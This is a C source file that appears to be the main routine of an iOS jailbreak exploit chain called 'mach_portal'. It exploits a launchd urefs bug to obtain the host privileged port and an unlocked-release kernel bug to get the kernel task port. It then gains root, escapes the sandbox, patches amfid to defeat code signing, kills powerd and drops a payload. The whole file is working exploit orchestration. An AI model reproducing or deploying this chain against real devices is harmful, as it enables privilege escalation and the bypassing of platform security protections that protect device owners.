#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


#include "sandbox_escape.h"
#include "kernel_sploit.h"
#include "disable_protections.h"
#include "patch_amfid.h"
#include "drop_payload.h"
#include "unsandboxer.h"
#include "offsets.h"
#include "kernel_memory_helpers.h"

/* CHANGE ME */
// change this to your unique app group id
char* app_group = "group.mach_portal";

int jb_go() {
  // do platform detection
  init_offsets();
  
  // exploit the urefs saturation bug; target launchd to impersonate a service
  // and get the task port for a root service and use that to get the host_priv port
  // which we need to trigger the kernel bug
  mach_port_t real_service_port, mitm_port;
  mach_port_t host_priv_port = get_host_priv_port(app_group, &real_service_port, &mitm_port);
  
  if (host_priv_port == MACH_PORT_NULL) {
    printf("[-] getting host priv port failed :-( \n");
    exit(EXIT_FAILURE);
  }
  
  printf("[+] got host priv port\n");
  
  // exploit the unlocked release bug to get the kernel task port:
  uint64_t kernel_base = 0;
  uint64_t realhost = 0;
  mach_port_t kernel_task_port = get_kernel_task_port(host_priv_port, &kernel_base, &realhost);
  
  if (kernel_task_port == MACH_PORT_NULL) {
    printf("[-] failed to get kernel task port\n");
    exit(EXIT_FAILURE);
  }
  
  printf("[+] got kernel task port!\n");
  printf("[+] kernel is at 0x%llx\n", kernel_base);
  
  init_kernel_memory_helpers(kernel_task_port);
  
  // get root and leave the sandbox
  disable_protections(kernel_base, realhost, "mach_portal");
  
  // make our host port the priv one - this won't persist across an exec
  // but we fix that in disable_protections() later
  task_set_special_port(mach_task_self(), TASK_HOST_PORT, host_priv_port);
  
  printf("uid: %d\n", getuid());
  
  // fix up the mess we made in launchd
  fix_launchd_after_sandbox_escape(real_service_port, mitm_port);
  
  printf("fixed up launchd, iohideventsystem should work again now\n");
  
  kill_powerd();
  
  printf("killed powerd again so it will talk to the real service\n");
  
  mach_port_t amfid_task_port = get_amfid_task_port();
  patch_amfid(amfid_task_port);
  
  start_bootstrap_unsandboxer();
  
  drop_payload();
  
  return 0;
}
